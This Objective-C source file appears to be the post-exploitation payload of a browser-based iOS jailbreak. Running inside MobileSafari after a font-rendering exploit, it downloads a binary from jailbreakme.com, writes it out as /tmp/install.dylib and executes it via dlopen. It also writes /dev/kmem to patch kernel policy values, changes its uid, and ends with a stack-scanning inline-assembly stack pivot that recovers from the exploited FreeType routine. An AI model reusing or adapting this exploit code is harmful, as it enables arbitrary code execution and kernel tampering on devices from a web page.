#include <stdlib.h>
#import <dumpedUIKit/UIAlertView.h>
#import <dumpedUIKit/UIApplication.h>
#import <dumpedUIKit/UIImageView.h>
#import <dumpedUIKit/UIColor.h>
#import <dumpedUIKit/UIWindow.h>
#import <dumpedUIKit/UIProgressBar.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <assert.h>
#include <pthread.h>
#include <dlfcn.h>
#include <CommonCrypto/CommonDigest.h>
#include <CoreGraphics/CoreGraphics.h>
#include <fcntl.h>
#include "common.h"
#include "dddata.h"
#include <objc/runtime.h>
#include <signal.h>
//#include "crc32.h"

#define TESTING 0
#define SLEEP 0
#define WAD_URL @"http://jailbreakme.com/wad.bin"
#define EXPECTED_DOMAIN @"jailbreakme.com"
@interface NSObject (ShutUpGcc)
+ (id)sharedBrowserController;
- (id)tabController;
- (id)activeTabDocument;
-(void)loadURL:(id)url userDriven:(BOOL)driven;
@end

@interface Dude : NSObject {
    UIAlertView *progressAlertView;
    UIAlertView *choiceAlertView;
    UIAlertView *doneAlertView;
    UIProgressView *progressBar;
    NSMutableData *wad;
    long long expectedLength;
    const char *freeze;
    int freeze_len;
    unsigned char *one;
    unsigned int one_len;
    NSURLConnection *connection;
}
@end

static Dude *dude;
static BOOL is_hung;

@implementation Dude

- (id)initWithOne:(unsigned char *)one_ oneLen:(int)one_len_ {
    if(self = [super init]) {
        one = one_;
        one_len = one_len_;
        //[self showPurple];
    }
    return self;
}

static void unpatch() {
    int fd = open("/dev/kmem", O_RDWR);
    if(fd <= 0) goto fail;
    unsigned int things[2] = {1, 2}; // original values of staticmax, maxindex
    if(pwrite(fd, &things, sizeof(things), CONFIG_MAC_POLICY_LIST + 8) != sizeof(things)) goto fail;
    close(fd);
    setuid(501);
    return;
fail:
    NSLog(@"Unpatch failed!");
}

#if CONFIG_KILL_SB
static BOOL my_suspendForEventsOnly(id self, SEL sel, BOOL whatever) {
    system("killall SpringBoard");
    exit(1);
}

static void allow_quit() {
    Class cls = objc_getClass("Application"); // MobileSafari specific, thanks phoenix3200
    Method m;
    m = class_getInstanceMethod(cls, @selector(_suspendForEventsOnly:));
    method_setImplementation(m, (IMP) my_suspendForEventsOnly);
}
#endif

static void set_progress(float progress) {
    [dude performSelectorOnMainThread:@selector(setProgress:) withObject:[NSNumber numberWithFloat:progress] waitUntilDone:NO];
}

- (void)setProgress:(NSNumber *)progress {
    [progressBar setProgress:[progress floatValue]];
}

- (void)setProgressCookie:(unsigned int)progress {
    NSHTTPCookie *cookie = [NSHTTPCookie cookieWithProperties:[NSDictionary dictionaryWithObjectsAndKeys:
    @"progress", NSHTTPCookieName,
    [NSString stringWithFormat:@"%u_%f", progress, [[NSDate date] timeIntervalSince1970]], NSHTTPCookieValue,
    @"jailbreakme.com", NSHTTPCookieDomain,
    @"/", NSHTTPCookiePath,
    @"Sat, 01 Feb 2020 05:00:00 GMT", NSHTTPCookieExpires,
    nil]];
    [[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookie:cookie];
}

- (void)doStuff {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    void *handle = dlopen("/tmp/install.dylib", RTLD_LAZY);
    if(!handle) abort();
    void (*do_install)(const char *, int, void (*)(float), unsigned int, unsigned char *, unsigned int) = dlsym(handle, "do_install");

#if !SLEEP
    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);
#else
    for(int i = 0; i < 10; i++) { set_progress(0.1 * i); usleep(250000); }
#endif

    NSLog(@"Um, I guess it worked.");
    unpatch();

    [progressAlertView dismissWithClickedButtonIndex:1 animated:YES];
    [progressAlertView release];
    progressAlertView = nil;

#if CONFIG_KILL_SB
    allow_quit();
#endif
    doneAlertView = [[UIAlertView alloc] initWithTitle:@"Cydia has been added to the home screen." message:@"Have fun!" delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
    [doneAlertView show];
   
    [self setProgressCookie:2];
}

- (void)bored {
    if([progressAlertView.message isEqualToString:@"This might take a while."]) {
        progressAlertView.message = @"(*yawn*)";
    }
}

- (void)bored2 {
    if([progressAlertView.message isEqualToString:@"(*yawn*)"]) {
        if(!memcmp(CONFIG_PLATFORM, "iPhone3,1", 9)) {
            progressAlertView.message = @"(Let go of the black strip on the left. ;)";
        } else {
            progressAlertView.message = @"(Come on, it's only a few megs!)";
        }
    }
}

- (void)connection:(NSURLConnection *)connection_ didReceiveResponse:(NSURLResponse *)response {
    expectedLength = [response expectedContentLength];   
}

- (void)connection:(NSURLConnection *)connection_ didReceiveData:(NSData *)data {
    [wad appendData:data];
    [progressBar setProgress:((float)[wad length])/expectedLength];
}

struct wad {
    unsigned int magic;
    unsigned int full_size;
    unsigned int first_part_size;
    unsigned char data[];
};

- (void)connectionDidFinishLoading:(NSURLConnection *)connection_ {
    [connection release];
    connection = nil;
    NSString *message;
    const struct wad *sw = [wad bytes];
    if([wad length] < sizeof(struct wad)) {
        message = @"File received was truncated.";
        goto error;
    }
    if(sw->magic != 0x42424242) {
        message = @"File received was invalid.";
        goto error;
    }
    if([wad length] != sw->full_size) {
        message = @"File received was truncated.";
        goto error;
    }
    /*unsigned long calculated_crc = crc32((void *) &sw->first_part_size, [wad length] - sizeof(unsigned long));
    if(calculated_crc != sw->crc) {
        message = @"Invalid file received.  Are you on a fail wi-fi connection?";
        NSLog(@"length=%u first_part_size=%u", [wad length], sw->first_part_size);
        NSLog(@"calculated=%u expected=%u", calculated_crc, sw->crc);
        //[wad writeToFile:@"/var/mobile/Media/wad.bin" atomically:NO];
        goto error;
    }*/
    [[[wad subdataWithRange:NSMakeRange(sizeof(struct wad), sw->first_part_size)] inflatedData] writeToFile:@"/tmp/install.dylib" atomically:NO];
    freeze = &sw->data[sw->first_part_size];
    freeze_len = [wad length] - sizeof(struct wad) - sw->first_part_size;
    progressAlertView.title = @"Jailbreaking...";
    progressAlertView.message = @"Sit tight.";
    [progressBar setProgress:0.0];
   
    [UIView beginAnimations:nil context:nil];
    //progressBar.frame = CGRectMake(92, 90, 110, 10);
    [[[progressAlertView buttons] objectAtIndex:0] removeFromSuperview];
    [[progressAlertView buttons] removeObjectAtIndex:0];
    [progressAlertView layoutAnimated:YES];
    [UIView commitAnimations];

    [NSThread detachNewThreadSelector:@selector(doStuff) toTarget:self withObject:nil];
    return;
    error:

    [progressAlertView dismissWithClickedButtonIndex:1 animated:YES];
    [progressAlertView release];
    progressAlertView = nil;

    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Oops..." message:message delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:@"Retry", nil];
    [choiceAlertView show];
}

- (void)connection:(NSURLConnection *)connection_ didFailWithError:(NSError *)error {
    [connection release];
    connection = nil;

    [progressAlertView dismissWithClickedButtonIndex:1 animated:YES];
    [progressAlertView release];
    progressAlertView = nil;

    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Oops..." message:[error localizedDescription] delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:@"Retry", nil];
    [choiceAlertView show];
}

- (void)keepGoing {
    // Okay, we can keep going.
    [[UIApplication sharedApplication] setIdleTimerDisabled:YES];
    progressAlertView = [[UIAlertView alloc] initWithTitle:@"Downloading..." message:@"This might take a while.\n\n\n" delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:nil];
    progressBar = [[UIProgressView alloc] initWithFrame:CGRectMake(92, 90, 100, 10)];
    //[progressBar setProgressViewStyle:CONFIG_PROGRESS_BAR_STYLE];
    [progressAlertView addSubview:progressBar];
    [progressAlertView show]; 
    wad = [[NSMutableData alloc] init];
    
    connection = [[NSURLConnection alloc] initWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:WAD_URL]] delegate:self];

    [NSTimer scheduledTimerWithTimeInterval:20 target:self selector:@selector(bored) userInfo:nil repeats:NO];
    [NSTimer scheduledTimerWithTimeInterval:40 target:self selector:@selector(bored2) userInfo:nil repeats:NO];
}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
    NSLog(@"alertView:%@ clickedButtonAtIndex:%d", alertView, (int)buttonIndex);
    NSLog(@"choice = %@ progress = %@", choiceAlertView, progressAlertView);

    if(alertView == choiceAlertView) {
        [choiceAlertView release];
        choiceAlertView = nil;

        if(buttonIndex == 0) {
            // The user hit cancel, just crash.
            unpatch();
            [self setProgressCookie:3];
            if(is_hung) {
                [[UIApplication sharedApplication] terminateWithSuccess];
            }
        } else {
            [self keepGoing];
        }
    } else if(alertView == progressAlertView) {
        [progressAlertView release];
        progressAlertView = nil;
        NSLog(@"connection = %@", connection);
        if(buttonIndex == 0 && connection) {
            [connection cancel];
            [connection release];
            connection = nil;
        }
    } else if(alertView == doneAlertView) {
        [doneAlertView release];
        doneAlertView = nil;
    }
}

- (void)start {
    //[NSThread detachNewThreadSelector:@selector(pipidi:) toTarget:self withObject:port];
    id tabDocument = [[[(id)objc_getClass("BrowserController") sharedBrowserController] tabController] activeTabDocument];
    NSString *host = [[tabDocument URL] host];
    if(![host isEqualToString:EXPECTED_DOMAIN] && ![host isEqualToString:[@"www." stringByAppendingString:EXPECTED_DOMAIN]]) return;
    if(!access("/bin/bash", F_OK)) {
        choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"Warning: It looks like you're already jailbroken.  Doing it again might be harmful." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
        [choiceAlertView show];
    } else {
#if TESTING
        choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"This dialog for testing only..." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
        [choiceAlertView show];
#else
        [self keepGoing];
#endif
    }
}
@end

__attribute__((noinline))
void foo() {
    asm("");
}

static void bus() {
    is_hung = true;
    sleep((unsigned int) -1);
}

static void work_around_apple_bugs() {
    signal(SIGBUS, bus);
    //[DeveloperBannerView updateWithFileName:UTI:]:
}

void iui_go(unsigned char **ptr, unsigned char *one, unsigned int one_len) {
    NSLog(@"iui_go: one=%p one_len=%d", one, one_len);
    NSLog(@"*one = %d", (int) *one);
    work_around_apple_bugs();
    
    dude = [[Dude alloc] initWithOne:one oneLen:one_len];
    [dude performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:NO];
    
    // hmm.
    NSLog(@"ptr = %p; *ptr = %p; **ptr = %u", ptr, *ptr, (unsigned int) **ptr);
    **ptr = 0x0e; // endchar

    // mm.    
    unsigned int *top = pthread_get_stackaddr_np(pthread_self());
    size_t size = pthread_get_stacksize_np(pthread_self());
    unsigned int *bottom = (void *) ((char *)top - size);
    NSLog(@"top = %p size = %d", top, (int) size);
    unsigned int *addr = top;
    while(*--addr != 0xf00df00d) {
        if(addr == bottom) {
            NSLog(@"Couldn't find foodfood.");
#if TESTING
            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
#endif
            abort();
        }
    }
    NSLog(@"foodfood found at %p comparing to %p", addr, CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH);
    void *return_value;
    while(1) {
        if(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400)) {
            // Return to ft_path_builder_create_path_for_glyph
            NSLog(@"Returning to create_path_for_glyph");
            return_value = (void *) CGPathCreateMutable();
            goto returnx;
        }
        if(*addr >= CONFIG_GET_GLYPH_BBOXES && *addr < CONFIG_GET_GLYPH_BBOXES + 0x100) {
            NSLog(@"Returning to get_glyph_bboxes");
            return_value = NULL;
            goto returnx;
        }
        addr++;
        if(addr == top) {
            NSLog(@"We got back up to the top... ");
#if TESTING
            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
#endif
            abort();
        }
    }

    returnx:
    NSLog(@"Setting SP to %p - 7", addr);
    foo();
    addr -= 7;
    // get a return value.
    CGMutablePathRef path = CGPathCreateMutable();
    asm("mov sp, %0; mov r0, %1; pop {r8, r10, r11}; pop {r4-r7, pc}" ::"r"(addr), "r"(return_value));
}
